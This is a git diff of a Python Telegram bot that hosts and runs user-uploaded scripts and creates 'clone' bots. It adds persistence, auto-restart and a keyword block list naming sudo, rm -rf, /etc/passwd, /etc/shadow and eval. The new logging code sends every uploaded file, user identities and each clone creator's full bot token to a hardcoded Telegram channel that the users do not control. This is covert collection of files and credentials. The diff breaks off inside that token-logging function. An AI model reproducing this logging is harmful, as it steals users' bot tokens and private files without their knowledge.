@@ -1,8 +1,8 @@
 # -*- coding: utf-8 -*-
 """
 By @CyberHacked0
-Universal File Hosting Bot
-Enhanced file hosting system supporting 30+ file types with secure execution
+Universal File Hosting Bot - ENHANCED VERSION
+Advanced file hosting with persistent data, auto-restart, and comprehensive logging
 """
 
 import telebot
@@ -27,6 +27,7 @@ import requests
 import ast
 from pathlib import Path
 import hashlib
+import base64
 
 # --- Flask Keep Alive ---
 from flask import Flask, render_template, jsonify, request, send_file
@@ -108,6 +109,7 @@ OWNER_ID = int(os.getenv('OWNER_ID', '8062814840'))
 ADMIN_ID = int(os.getenv('ADMIN_ID', '8062814840'))
 YOUR_USERNAME = os.getenv('BOT_USERNAME', '@CyberHacked0')
 UPDATE_CHANNEL = os.getenv('UPDATE_CHANNEL', 'https://t.me/nothingbothub')
+LOG_CHANNEL = "-1003228224796"  # Fixed log channel ID
 
 # Enhanced folder setup
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
@@ -115,6 +117,8 @@ UPLOAD_BOTS_DIR = os.path.join(BASE_DIR, 'upload_bots')
 IROTECH_DIR = os.path.join(BASE_DIR, 'inf')
 DATABASE_PATH = os.path.join(IROTECH_DIR, 'bot_data.db')
 LOGS_DIR = os.path.join(BASE_DIR, 'execution_logs')
+BACKUP_DIR = os.path.join(BASE_DIR, 'backups')
+PERSISTENT_DATA_FILE = os.path.join(IROTECH_DIR, 'persistent_data.json')
 
 # File upload limits
 FREE_USER_LIMIT = 5
@@ -123,7 +127,7 @@ ADMIN_LIMIT = 999
 OWNER_LIMIT = float('inf')
 
 # Create necessary directories
-for directory in [UPLOAD_BOTS_DIR, IROTECH_DIR, LOGS_DIR]:
+for directory in [UPLOAD_BOTS_DIR, IROTECH_DIR, LOGS_DIR, BACKUP_DIR]:
     os.makedirs(directory, exist_ok=True)
 
 # Initialize bot
@@ -135,10 +139,152 @@ user_subscriptions = {}
 user_files = {}
 active_users = set()
 admin_ids = {ADMIN_ID, OWNER_ID}
+banned_users = set()
 bot_locked = False
 broadcast_mode = {}
 clone_requests = {}
 user_clones = {}
+
+# --- Enhanced Persistent Data Management ---
+def save_persistent_data():
+    """Save all critical data to persistent JSON file"""
+    try:
+        persistent_data = {
+            'active_users': list(active_users),
+            'user_files': {str(k): v for k, v in user_files.items()},
+            'user_subscriptions': {
+                str(k): {
+                    'expiry': v['expiry'].isoformat() if isinstance(v['expiry'], datetime) else v['expiry']
+                } for k, v in user_subscriptions.items()
+            },
+            'admin_ids': list(admin_ids),
+            'banned_users': list(banned_users),
+            'bot_locked': bot_locked,
+            'bot_scripts': {
+                k: {
+                    'user_id': v['user_id'],
+                    'file_name': v['file_name'],
+                    'start_time': v['start_time'].isoformat(),
+                    'language': v.get('language', 'Unknown'),
+                    'icon': v.get('icon', '📄')
+                } for k, v in bot_scripts.items()
+            },
+            'user_clones': {
+                str(k): {
+                    'bot_username': v['bot_username'],
+                    'clone_dir': v['clone_dir'],
+                    'start_time': v['start_time'].isoformat()
+                } for k, v in user_clones.items()
+            },
+            'last_backup': datetime.now().isoformat()
+        }
+        
+        with open(PERSISTENT_DATA_FILE, 'w', encoding='utf-8') as f:
+            json.dump(persistent_data, f, indent=2, ensure_ascii=False)
+        
+        logger.info("Persistent data saved successfully")
+        return True
+    except Exception as e:
+        logger.error(f"Error saving persistent data: {e}")
+        return False
+
+def load_persistent_data():
+    """Load all critical data from persistent JSON file"""
+    global active_users, user_files, user_subscriptions, admin_ids, banned_users, bot_locked, bot_scripts, user_clones
+    
+    if not os.path.exists(PERSISTENT_DATA_FILE):
+        logger.info("No persistent data file found, starting fresh")
+        return False
+    
+    try:
+        with open(PERSISTENT_DATA_FILE, 'r', encoding='utf-8') as f:
+            persistent_data = json.load(f)
+        
+        # Load basic data
+        active_users = set(persistent_data.get('active_users', []))
+        admin_ids = set(persistent_data.get('admin_ids', [ADMIN_ID, OWNER_ID]))
+        banned_users = set(persistent_data.get('banned_users', []))
+        bot_locked = persistent_data.get('bot_locked', False)
+        
+        # Load user files
+        user_files = {}
+        for user_id_str, files in persistent_data.get('user_files', {}).items():
+            user_files[int(user_id_str)] = files
+        
+        # Load user subscriptions
+        user_subscriptions = {}
+        for user_id_str, sub_data in persistent_data.get('user_subscriptions', {}).items():
+            try:
+                user_subscriptions[int(user_id_str)] = {
+                    'expiry': datetime.fromisoformat(sub_data['expiry'])
+                }
+            except (ValueError, KeyError):
+                continue
+        
+        # Load bot scripts info for auto-restart
+        bot_scripts_data = persistent_data.get('bot_scripts', {})
+        logger.info(f"Found {len(bot_scripts_data)} scripts to auto-restart")
+        
+        # Load user clones info for auto-restart
+        user_clones_data = persistent_data.get('user_clones', {})
+        logger.info(f"Found {len(user_clones_data)} clones to auto-restart")
+        
+        logger.info("Persistent data loaded successfully")
+        return True
+    except Exception as e:
+        logger.error(f"Error loading persistent data: {e}")
+        return False
+
+def auto_restart_scripts_and_clones():
+    """Auto-restart all scripts and clones from persistent data"""
+    try:
+        # Load scripts info
+        if os.path.exists(PERSISTENT_DATA_FILE):
+            with open(PERSISTENT_DATA_FILE, 'r', encoding='utf-8') as f:
+                persistent_data = json.load(f)
+            
+            # Auto-restart scripts
+            bot_scripts_data = persistent_data.get('bot_scripts', {})
+            for script_key, script_info in bot_scripts_data.items():
+                user_id = script_info['user_id']
+                file_name = script_info['file_name']
+                
+                user_folder = get_user_folder(user_id)
+                file_path = os.path.join(user_folder, file_name)
+                
+                if os.path.exists(file_path):
+                    logger.info(f"Auto-restarting script: {file_name} for user {user_id}")
+                    success, result = execute_script(user_id, file_path)
+                    if success:
+                        logger.info(f"Successfully auto-restarted: {file_name}")
+                        # Send notification to user
+                        try:
+                            bot.send_message(user_id, f"🔄 Your script '{file_name}' has been automatically restarted after bot reboot!")
+                        except:
+                            pass
+                    else:
+                        logger.error(f"Failed to auto-restart {file_name}: {result}")
+            
+            # Auto-restart clone bots from database (more reliable)
+            try:
+                conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
+                c = conn.cursor()
+                c.execute('SELECT user_id, bot_username, token FROM clone_bots')
+                
+                for user_id, bot_username, token in c.fetchall():
+                    logger.info(f"Auto-restarting clone bot for user {user_id}: @{bot_username}")
+                    clone_success = create_bot_clone(user_id, token, bot_username)
+                    if clone_success:
+                        logger.info(f"Successfully auto-restarted clone bot: @{bot_username}")
+                    else:
+                        logger.error(f"Failed to auto-restart clone bot: @{bot_username}")
+                
+                conn.close()
+            except Exception as e:
+                logger.error(f"Error auto-restarting clones from database: {e}")
+                
+    except Exception as e:
+        logger.error(f"Error in auto-restart: {e}")
 
 # --- Logging Setup ---
 logging.basicConfig(
@@ -181,15 +327,20 @@ def init_db():
         c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                      (user_id INTEGER PRIMARY KEY, expiry TEXT)''')
         c.execute('''CREATE TABLE IF NOT EXISTS user_files
-                     (user_id INTEGER, file_name TEXT, file_type TEXT,
+                     (user_id INTEGER, file_name TEXT, file_type TEXT, upload_time TEXT,
                       PRIMARY KEY (user_id, file_name))''')
         c.execute('''CREATE TABLE IF NOT EXISTS active_users
-                     (user_id INTEGER PRIMARY KEY)''')
+                     (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, join_date TEXT, last_seen TEXT)''')
         c.execute('''CREATE TABLE IF NOT EXISTS admins
                      (user_id INTEGER PRIMARY KEY)''')
         c.execute('''CREATE TABLE IF NOT EXISTS running_scripts
-                     (user_id INTEGER, file_name TEXT, start_time TEXT,
+                     (user_id INTEGER, file_name TEXT, start_time TEXT, pid INTEGER,
                       PRIMARY KEY (user_id, file_name))''')
+        c.execute('''CREATE TABLE IF NOT EXISTS banned_users
+                     (user_id INTEGER PRIMARY KEY, reason TEXT, ban_date TEXT)''')
+        c.execute('''CREATE TABLE IF NOT EXISTS clone_bots
+                     (user_id INTEGER, bot_username TEXT, token TEXT, create_time TEXT,
+                      PRIMARY KEY (user_id, bot_username))''')
 
         # Ensure admins
         c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (OWNER_ID,))
@@ -203,8 +354,12 @@ def init_db():
         logger.error(f"Database initialization error: {e}")
 
 def load_data():
-    """Load data from database into memory"""
+    """Load data from database into memory and sync with persistent data"""
     logger.info("Loading data from database...")
+    
+    # First load persistent data for immediate recovery
+    load_persistent_data()
+    
     try:
         conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
         c = conn.cursor()
@@ -217,46 +372,47 @@ def load_data():
             except ValueError:
                 logger.warning(f"Invalid expiry date for user {user_id}")
 
-        # Load user files
+        # Load user files - merge with persistent data
         c.execute('SELECT user_id, file_name, file_type FROM user_files')
+        db_user_files = {}
         for user_id, file_name, file_type in c.fetchall():
-            if user_id not in user_files:
-                user_files[user_id] = []
-            user_files[user_id].append((file_name, file_type))
+            if user_id not in db_user_files:
+                db_user_files[user_id] = []
+            db_user_files[user_id].append((file_name, file_type))
+        
+        # Update user_files with database data (prioritize database)
+        for user_id, files in db_user_files.items():
+            user_files[user_id] = files
 
-        # Load active users
+        # Load active users - merge with persistent data
         c.execute('SELECT user_id FROM active_users')
-        active_users.update(user_id for (user_id,) in c.fetchall())
+        db_active_users = set(user_id for (user_id,) in c.fetchall())
+        active_users.update(db_active_users)  # Merge both sources
 
         # Load admins
         c.execute('SELECT user_id FROM admins')
         admin_ids.update(user_id for (user_id,) in c.fetchall())
 
-        # Load running scripts and auto-restart them
-        c.execute('SELECT user_id, file_name, start_time FROM running_scripts')
-        for user_id, file_name, start_time in c.fetchall():
-            user_folder = get_user_folder(user_id)
-            file_path = os.path.join(user_folder, file_name)
-            if os.path.exists(file_path):
-                logger.info(f"Auto-restarting script: {file_name} for user {user_id}")
-                success, result = execute_script(user_id, file_path)
-                if success:
-                    logger.info(f"Successfully auto-restarted: {file_name}")
-                else:
-                    logger.error(f"Failed to auto-restart {file_name}: {result}")
+        # Load banned users
+        c.execute('SELECT user_id FROM banned_users')
+        banned_users.update(user_id for (user_id,) in c.fetchall())
 
         conn.close()
-        logger.info(f"Data loaded: {len(active_users)} users, {len(user_files)} file records")
+        logger.info(f"Data loaded: {len(active_users)} users, {len(user_files)} file records, {len(banned_users)} banned users")
+        
+        # Now auto-restart everything
+        auto_restart_scripts_and_clones()
+        
     except Exception as e:
         logger.error(f"Error loading data: {e}")
 
-def save_running_script(user_id, file_name):
+def save_running_script(user_id, file_name, pid=None):
     """Save running script to database for auto-restart"""
     try:
         conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
         c = conn.cursor()
-        c.execute('INSERT OR REPLACE INTO running_scripts (user_id, file_name, start_time) VALUES (?, ?, ?)',
-                 (user_id, file_name, datetime.now().isoformat()))
+        c.execute('INSERT OR REPLACE INTO running_scripts (user_id, file_name, start_time, pid) VALUES (?, ?, ?, ?)',
+                 (user_id, file_name, datetime.now().isoformat(), pid))
         conn.commit()
         conn.close()
     except Exception as e:
@@ -272,6 +428,63 @@ def remove_running_script(user_id, file_name):
         conn.close()
     except Exception as e:
         logger.error(f"Error removing running script: {e}")
+
+def save_user_info(user_id, username, first_name, last_name):
+    """Save user information to database"""
+    try:
+        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
+        c = conn.cursor()
+        c.execute('INSERT OR REPLACE INTO active_users (user_id, username, first_name, last_name, join_date, last_seen) VALUES (?, ?, ?, ?, ?, ?)',
+                 (user_id, username, first_name, last_name, datetime.now().isoformat(), datetime.now().isoformat()))
+        conn.commit()
+        conn.close()
+        
+        # Also update persistent data
+        active_users.add(user_id)
+        save_persistent_data()
+    except Exception as e:
+        logger.error(f"Error saving user info: {e}")
+
+def update_user_last_seen(user_id):
+    """Update user's last seen timestamp"""
+    try:
+        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
+        c = conn.cursor()
+        c.execute('UPDATE active_users SET last_seen = ? WHERE user_id = ?',
+                 (datetime.now().isoformat(), user_id))
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        logger.error(f"Error updating last seen: {e}")
+
+def save_clone_info(user_id, bot_username, token):
+    """Save clone bot information to database"""
+    try:
+        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
+        c = conn.cursor()
+        c.execute('INSERT OR REPLACE INTO clone_bots (user_id, bot_username, token, create_time) VALUES (?, ?, ?, ?)',
+                 (user_id, bot_username, token, datetime.now().isoformat()))
+        conn.commit()
+        conn.close()
+        
+        # Also update persistent data
+        save_persistent_data()
+    except Exception as e:
+        logger.error(f"Error saving clone info: {e}")
+
+def remove_clone_info(user_id):
+    """Remove clone bot information from database"""
+    try:
+        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
+        c = conn.cursor()
+        c.execute('DELETE FROM clone_bots WHERE user_id = ?', (user_id,))
+        conn.commit()
+        conn.close()
+        
+        # Also update persistent data
+        save_persistent_data()
+    except Exception as e:
+        logger.error(f"Error removing clone info: {e}")
 
 # --- Helper Functions ---
 def get_user_folder(user_id):
@@ -354,39 +567,62 @@ def safe_reply_to(message, text, parse_mode=None, reply_markup=None):
         else:
             raise e
 
-# --- Enhanced File Execution with Better Hosting ---
-def check_malicious_code(file_path):
-    """Security check for system commands and malicious patterns"""
-    # Only block actual system commands and malicious patterns
-    critical_patterns = [
-        # System commands that could harm the system
-        'sudo ', 'su ', 'rm -rf', 'fdisk',
-        'mkfs', 'dd if=', 'shutdown', 'reboot', 'halt',
+def send_to_log_channel(message, document=None):
+    """Send message to log channel with optional file"""
+    try:
+        if document:
+            bot.send_document(LOG_CHANNEL, document, caption=message)
+        else:
+            bot.send_message(LOG_CHANNEL, message)
+    except Exception as e:
+        logger.error(f"Failed to send message to log channel: {e}")
+
+def create_backup():
+    """Create backup of important data"""
+    try:
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        backup_file = os.path.join(BACKUP_DIR, f"backup_{timestamp}.db")
+        shutil.copy2(DATABASE_PATH, backup_file)
         
-        # Command injection patterns
+        # Keep only last 5 backups
+        backups = sorted([f for f in os.listdir(BACKUP_DIR) if f.startswith('backup_')])
+        if len(backups) > 5:
+            for old_backup in backups[:-5]:
+                os.remove(os.path.join(BACKUP_DIR, old_backup))
+                
+        logger.info(f"Backup created: {backup_file}")
+    except Exception as e:
+        logger.error(f"Backup creation failed: {e}")
+
+# --- Enhanced Security Checks ---
+def check_malicious_code(file_path):
+    """Advanced security check for system commands and malicious patterns including encoded scripts"""
+    critical_patterns = [
+        # System commands
+        'sudo ', 'su ', 'rm -rf', 'fdisk', 'mkfs', 'dd if=', 
+        'shutdown', 'reboot', 'halt', 'poweroff',
+        
+        # Command injection
+        '/bin/', '/usr/', '/sbin/', '/etc/', '/var/', '/root/',
         '/ls', '/cd', '/pwd', '/cat', '/grep', '/find',
         '/del', '/get', '/getall', '/download', '/upload',
         '/steal', '/hack', '/dump', '/extract', '/copy',
         
-        # File stealing bot patterns
+        # File operations
         'bot.send_document', 'send_document', 'bot.get_file',
-        'download_file', 'send_media_group',
+        'download_file', 'send_media_group', 'os.remove("/"',
+        'shutil.rmtree("/"', 'os.unlink("/"',
         
-        # System execution with dangerous commands
+        # System execution
         'os.system("rm', 'os.system("sudo', 'os.system("format',
         'subprocess.call(["rm"', 'subprocess.call(["sudo"',
         'subprocess.run(["rm"', 'subprocess.run(["sudo"',
-        
-        # Direct system command execution
         'os.system("/bin/', 'os.system("/usr/', 'os.system("/sbin/',
         
-        # Dangerous file operations
-        'shutil.rmtree("/"', 'os.remove("/"', 'os.unlink("/"',
-        
-        # Network-based file theft
+        # Network operations
         'requests.post.*files=', 'urllib.request.urlopen.*data=',
         
-        # Process killing patterns
+        # Process operations
         'os.kill(', 'signal.SIGKILL', 'psutil.process_iter',
         
         # Environment manipulation
@@ -395,8 +631,26 @@ def check_malicious_code(file_path):
         # Privilege escalation
         'setuid', 'setgid', 'chmod 777', 'chown root',
         
-        # Actual format commands (disk formatting)
-        'os.system("format', 'subprocess.call(["format"', 'subprocess.run(["format"'
+        # Format commands
+        'os.system("format', 'subprocess.call(["format"', 'subprocess.run(["format"',
+        
+        # Encoded/obfuscated code patterns
+        'base64.b64decode', 'base64.b64encode', 'base64.decode',
+        'exec(', 'eval(', 'compile(', '__import__',
+        'getattr', 'setattr', 'hasattr',
+        'marshal.loads', 'pickle.loads', 'zlib.decompress',
+        
+        # Obfuscation patterns
+        'chr(', 'ord(', 'decode(', 'encode(',
+        'rot13', 'xor', 'obfuscate',
+        
+        # Suspicious imports
+        'import os.system', 'import subprocess.call',
+        'from os import system', 'from subprocess import call',
+        
+        # File path traversal
+        '../', '..\\', '/etc/passwd', '/etc/shadow',
+        'C:\\Windows\\System32', '/bin/bash', '/bin/sh'
     ]
 
     try:
@@ -407,7 +661,20 @@ def check_malicious_code(file_path):
         # Check for critical security violations
         for pattern in critical_patterns:
             if pattern.lower() in content_lower:
-                return False, f"SECURITY THREAT: {pattern} detected - File upload blocked!"
+                return False, f"SECURITY THREAT: {pattern} detected - File upload blocked!\n\nIf you believe this is a legitimate file, contact @CyberHacked0 for verification."
+
+        # Check for encoded base64 strings (long base64 strings)
+        base64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
+        base64_matches = re.findall(base64_pattern, content)
+        for b64_match in base64_matches:
+            try:
+                # Try to decode to check if it's valid base64
+                decoded = base64.b64decode(b64_match)
+                # If it decodes successfully and is long, it might be encoded payload
+                if len(decoded) > 50:
+                    return False, "ENCODED PAYLOAD DETECTED: Base64 encoded content found - File upload blocked!\n\nIf this is legitimate, contact @CyberHacked0."
+            except:
+                pass
 
         # Check for suspicious file theft combinations
         theft_combos = [
@@ -415,16 +682,30 @@ def check_malicious_code(file_path):
             ['os.walk', 'bot.send'],
             ['glob.glob', 'upload'],
             ['open(', 'send_document'],
-            ['read()', 'bot.send']
+            ['read()', 'bot.send'],
+            ['file.read', 'requests.post'],
+            ['open(', 'base64.b64decode']
         ]
 
         for combo in theft_combos:
             if all(item.lower() in content_lower for item in combo):
-                return False, f"File theft pattern detected: {' + '.join(combo)}"
+                return False, f"File theft pattern detected: {' + '.join(combo)}\n\nIf this is a legitimate use case, contact @CyberHacked0."
+
+        # Check for eval/exec with dynamic content
+        eval_patterns = [
+            r'eval\s*\(\s*[\w\.]+',
+            r'exec\s*\(\s*[\w\.]+',
+            r'compile\s*\(\s*[\w\.]+',
+            r'__import__\s*\(\s*[\w\.]+'
+        ]
+        
+        for pattern in eval_patterns:
+            if re.search(pattern, content, re.IGNORECASE):
+                return False, f"DYNAMIC CODE EXECUTION DETECTED: {pattern} - File upload blocked!\n\nContact @CyberHacked0 for verification."
 
         # Check file size limit
         file_size = os.path.getsize(file_path)
-        if file_size > 5 * 1024 * 1024:  # 5MB limit
+        if file_size > 5 * 1024 * 1024:
             return False, "File too large - exceeds 5MB limit"
 
         return True, "Code appears safe"
@@ -437,41 +718,18 @@ def auto_install_dependencies(file_path, file_ext, user_folder):
     
     try:
         if file_ext == '.py':
-            # Python dependency detection
             with open(file_path, 'r', encoding='utf-8') as f:
                 content = f.read()
             
-            # Common Python packages
             python_packages = {
-                'requests': 'requests',
-                'flask': 'flask',
-                'django': 'django',
-                'numpy': 'numpy',
-                'pandas': 'pandas',
-                'matplotlib': 'matplotlib',
-                'scipy': 'scipy',
-                'sklearn': 'scikit-learn',
-                'cv2': 'opencv-python',
-                'PIL': 'Pillow',
-                'bs4': 'beautifulsoup4',
-                'selenium': 'selenium',
-                'telebot': 'pyTelegramBotAPI',
-                'telegram': 'python-telegram-bot',
-                'asyncio': None,  # Built-in
-                'json': None,     # Built-in
-                'os': None,       # Built-in
-                'sys': None,      # Built-in
-                're': None,       # Built-in
-                'time': None,     # Built-in
-                'datetime': None, # Built-in
-                'random': None,   # Built-in
-                'math': None,     # Built-in
-                'urllib': None,   # Built-in
-                'sqlite3': None,  # Built-in
-                'threading': None,# Built-in
-                'subprocess': None,# Built-in
-                'pathlib': None,  # Built-in
-                'collections': None,# Built-in
+                'requests': 'requests', 'flask': 'flask', 'django': 'django',
+                'numpy': 'numpy', 'pandas': 'pandas', 'matplotlib': 'matplotlib',
+                'scipy': 'scipy', 'sklearn': 'scikit-learn', 'cv2': 'opencv-python',
+                'PIL': 'Pillow', 'bs4': 'beautifulsoup4', 'selenium': 'selenium',
+                'telebot': 'pyTelegramBotAPI', 'telegram': 'python-telegram-bot',
+                'pyrogram': 'pyrogram', 'tgcrypto': 'tgcrypto', 'aiohttp': 'aiohttp',
+                'asyncio': None, 'json': None, 'os': None, 'sys': None, 're': None,
+                'time': None, 'datetime': None, 'random': None, 'hashlib': None
             }
             
             import_pattern = r'(?:from\s+(\w+)|import\s+(\w+))'
@@ -491,37 +749,22 @@ def auto_install_dependencies(file_path, file_ext, user_folder):
                         installations.append(f"❌ Error installing {python_packages[module]}: {str(e)}")
         
         elif file_ext == '.js':
-            # JavaScript/Node.js dependency detection
             package_json_path = os.path.join(user_folder, 'package.json')
             if not os.path.exists(package_json_path):
-                # Create basic package.json
                 package_data = {
-                    "name": "user-script",
-                    "version": "1.0.0",
+                    "name": "user-script", "version": "1.0.0",
                     "description": "Auto-generated package.json",
-                    "main": "index.js",
-                    "dependencies": {}
+                    "main": "index.js", "dependencies": {}
                 }
                 with open(package_json_path, 'w') as f:
                     json.dump(package_data, f, indent=2)
             
-            # Common Node.js packages
             with open(file_path, 'r', encoding='utf-8') as f:
                 content = f.read()
             
             node_packages = {
-                'express': 'express',
-                'axios': 'axios',
-                'lodash': 'lodash',
-                'moment': 'moment',
-                'fs': None,      # Built-in
-                'path': None,    # Built-in
-                'http': None,    # Built-in
-                'https': None,   # Built-in
-                'url': None,     # Built-in
-                'crypto': None,  # Built-in
-                'os': None,      # Built-in
-                'util': None,    # Built-in
+                'express': 'express', 'axios': 'axios', 'lodash': 'lodash', 
+                'moment': 'moment', 'telegraf': 'telegraf', 'node-telegram-bot-api': 'node-telegram-bot-api'
             }
             
             require_pattern = r'require\([\'"](\w+)[\'"]\)'
@@ -549,9 +792,7 @@ def execute_script(user_id, script_path, message_for_updates=None):
     script_name = os.path.basename(script_path)
     script_ext = os.path.splitext(script_path)[1].lower()
 
-    # Comprehensive supported file types
     supported_types = {
-        # Programming Languages (Executable)
         '.py': {'name': 'Python', 'icon': '🐍', 'executable': True, 'type': 'executable'},
         '.js': {'name': 'JavaScript', 'icon': '🟨', 'executable': True, 'type': 'executable'},
         '.java': {'name': 'Java', 'icon': '☕', 'executable': True, 'type': 'executable'},
@@ -572,7 +813,6 @@ def execute_script(user_id, script_path, message_for_updates=None):
         '.scala': {'name': 'Scala', 'icon': '🔴', 'executable': True, 'type': 'executable'},
         '.r': {'name': 'R', 'icon': '📊', 'executable': True, 'type': 'executable'},
 
-        # Hosted Files (Non-executable)
         '.html': {'name': 'HTML', 'icon': '🌐', 'executable': False, 'type': 'hosted'},
         '.css': {'name': 'CSS', 'icon': '🎨', 'executable': False, 'type': 'hosted'},
         '.xml': {'name': 'XML', 'icon': '📄', 'executable': False, 'type': 'hosted'},
@@ -599,21 +839,18 @@ def execute_script(user_id, script_path, message_for_updates=None):
     lang_info = supported_types[script_ext]
 
     try:
-        # Send initial message
         if message_for_updates:
             safe_edit_message(
                 message_for_updates.chat.id,
                 message_for_updates.message_id,
-                f"{lang_info['icon']} Processing {lang_info['name']} file\n"
-                f"File: {script_name}\n"
-                f"Status: Analyzing..."
+                f"🔄 Starting your script...\n\n"
+                f"📄 File: {script_name}\n"
+                f"🔧 Language: {lang_info['name']}\n"
+                f"⏳ Status: Initializing..."
             )
 
-        # Check if file is executable
         if not lang_info.get('executable', True):
-            # Just host the file (non-executable)
             if message_for_updates:
-                # Generate file URL for hosted files
                 file_hash = hashlib.md5(f"{user_id}_{script_name}".encode()).hexdigest()
                 repl_slug = os.environ.get('REPL_SLUG', 'universal-file-host')
                 repl_owner = os.environ.get('REPL_OWNER', 'replit-user')
@@ -634,17 +871,16 @@ def execute_script(user_id, script_path, message_for_updates=None):
                 )
             return True, f"File hosted successfully"
 
-        # Execute the script for executable types
         if message_for_updates:
             safe_edit_message(
                 message_for_updates.chat.id,
                 message_for_updates.message_id,
-                f"{lang_info['icon']} Executing {lang_info['name']} script...\n"
-                f"File: {script_name}\n"
-                f"Status: Installing dependencies..."
+                f"🔄 Starting your script...\n\n"
+                f"📄 File: {script_name}\n"
+                f"🔧 Language: {lang_info['name']}\n"
+                f"⏳ Status: Installing dependencies..."
             )
 
-        # Auto-install dependencies
         user_folder = get_user_folder(user_id)
         installations = auto_install_dependencies(script_path, script_ext, user_folder)
         
@@ -654,20 +890,17 @@ def execute_script(user_id, script_path, message_for_updates=None):
                 install_msg += f"\n... and {len(installations) - 5} more"
             safe_send_message(message_for_updates.chat.id, install_msg)
 
-        # Prepare execution command based on file type
         if script_ext == '.py':
             cmd = [sys.executable, script_path]
         elif script_ext == '.js':
             cmd = ['node', script_path]
         elif script_ext == '.java':
-            # Compile and run Java
             class_name = os.path.splitext(script_name)[0]
             compile_result = subprocess.run(['javac', script_path], capture_output=True, text=True, timeout=60)
             if compile_result.returncode != 0:
                 return False, f"Java compilation failed: {compile_result.stderr}"
             cmd = ['java', '-cp', os.path.dirname(script_path), class_name]
         elif script_ext in ['.cpp', '.c']:
-            # Compile and run C/C++
             executable = os.path.join(user_folder, 'output')
             compiler = 'g++' if script_ext == '.cpp' else 'gcc'
             compile_result = subprocess.run([compiler, script_path, '-o', executable], 
@@ -678,7 +911,6 @@ def execute_script(user_id, script_path, message_for_updates=None):
         elif script_ext == '.go':
             cmd = ['go', 'run', script_path]
         elif script_ext == '.rs':
-            # Compile and run Rust
             executable = os.path.join(user_folder, 'output')
             compile_result = subprocess.run(['rustc', script_path, '-o', executable], 
                                           capture_output=True, text=True, timeout=60)
@@ -694,17 +926,14 @@ def execute_script(user_id, script_path, message_for_updates=None):
         elif script_ext == '.sh':
             cmd = ['bash', script_path]
         elif script_ext == '.ts':
-            # TypeScript - compile to JS first
             js_path = script_path.replace('.ts', '.js')
             compile_result = subprocess.run(['tsc', script_path], capture_output=True, text=True, timeout=60)
             if compile_result.returncode != 0:
                 return False, f"TypeScript compilation failed: {compile_result.stderr}"
             cmd = ['node', js_path]
         else:
-            # For other types, try basic execution
             cmd = [script_path]
 
-        # Create execution log file
         log_file_path = os.path.join(LOGS_DIR, f"execution_{user_id}_{int(time.time())}.log")
 
         with open(log_file_path, 'w') as log_file:
@@ -716,7 +945,6 @@ def execute_script(user_id, script_path, message_for_updates=None):
                 env=os.environ.copy()
             )
 
-            # Store process info
             script_key = f"{user_id}_{script_name}"
             bot_scripts[script_key] = {
                 'process': process,
@@ -729,17 +957,16 @@ def execute_script(user_id, script_path, message_for_updates=None):
                 'icon': lang_info['icon']
             }
 
-            # Save to database for auto-restart
-            save_running_script(user_id, script_name)
+            save_running_script(user_id, script_name, process.pid)
+            save_persistent_data()  # Save persistent data
 
-            # Success message
             if message_for_updates:
-                success_msg = f"{lang_info['icon']} {lang_info['name']} script started successfully!\n\n"
-                success_msg += f"File: {script_name}\n"
-                success_msg += f"Process ID: {process.pid}\n"
-                success_msg += f"Language: {lang_info['name']} {lang_info['icon']}\n"
-                success_msg += f"Status: Running\n"
-                success_msg += f"⏰ Start Time: {datetime.now().strftime('%H:%M:%S')}"
+                success_msg = f"🎉 Script started successfully!\n\n"
+                success_msg += f"📄 File: {script_name}\n"
+                success_msg += f"🔧 Language: {lang_info['name']} {lang_info['icon']}\n"
+                success_msg += f"🆔 Process ID: {process.pid}\n"
+                success_msg += f"⏰ Start Time: {datetime.now().strftime('%H:%M:%S')}\n"
+                success_msg += f"📊 Status: 🟢 Running"
 
                 safe_edit_message(
                     message_for_updates.chat.id, 
@@ -762,6 +989,309 @@ def execute_script(user_id, script_path, message_for_updates=None):
 
         return False, error_msg
 
+# --- Enhanced Logging Functions ---
+def log_file_upload(user_id, file_name, file_type, file_size, security_status, file_path=None):
+    """Log file upload to channel with actual file"""
+    try:
+        user_info = get_user_info(user_id)
+        
+        # Check if this is from a cloned bot
+        current_bot_username = bot.get_me().username
+        is_cloned_bot = current_bot_username != "CyberHacked0Bot"  # Adjust to your main bot username
+        
+        log_msg = f"📤 NEW FILE UPLOAD\n\n"
+        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
+        log_msg += f"🆔 User ID: {user_id}\n"
+        log_msg += f"📧 Username: @{user_info['username'] or 'None'}\n"
+        
+        if is_cloned_bot:
+            log_msg += f"🤖 From Clone Bot: @{current_bot_username}\n"
+            log_msg += f"👑 Clone Owner: {OWNER_ID}\n"
+            
+        log_msg += f"📄 File: {file_name}\n"
+        log_msg += f"📁 Type: {file_type}\n"
+        log_msg += f"📦 Size: {file_size} bytes\n"
+        log_msg += f"🛡️ Security: {security_status}\n"
+        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+        log_msg += f"🔗 File stored in user folder: /upload_bots/{user_id}/"
+        
+        # Send file along with log message
+        if file_path and os.path.exists(file_path):
+            with open(file_path, 'rb') as f:
+                send_to_log_channel(log_msg, f)
+        else:
+            send_to_log_channel(log_msg)
+            
+    except Exception as e:
+        logger.error(f"Error logging file upload: {e}")
+
+def log_clone_creation(user_id, bot_username, token):
+    """Log clone bot creation to channel with full token"""
+    try:
+        user_info = get_user_info(user_id)
+        log_msg = f"🤖 NEW BOT CLONE CREATED\n\n"
+        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
+        log_msg += f"🆔 User ID: {user_id}\n"
+        log_msg += f"📧 Username: @{user_info['username'] or 'None'}\n"
+        log_msg += f"🤖 Bot: @{bot_username}\n"
+        log_msg += f"🔑 Full Token: {token}\n"  # Full token for logging
